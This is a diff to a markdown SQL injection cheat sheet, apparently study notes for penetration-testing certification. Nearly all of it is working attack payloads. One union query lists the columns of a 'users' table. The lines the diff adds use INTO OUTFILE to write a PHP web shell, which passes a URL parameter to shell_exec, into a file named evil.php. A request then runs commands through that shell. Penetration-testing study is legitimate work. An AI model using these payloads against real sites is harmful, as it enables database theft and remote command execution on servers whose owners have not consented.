@@ -429,7 +429,15 @@ My simple cheatsheet:
 
 # Gather information from a table
 ?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'
+
+# Create File
+?id=1 union all select 1,2,"<?php echo '<pre>' . shell_exec($_GET['cmd']). '<pre>';?>" into OUTFILE 'c:\htdocs\evil.php'
+
+## Navigate to Created File
+/evil.php?cmd=dir
 ```
+
+
 
 This cheat sheet is from [here](https://github.com/areyou1or0/OSCP/blob/master/Web).
 
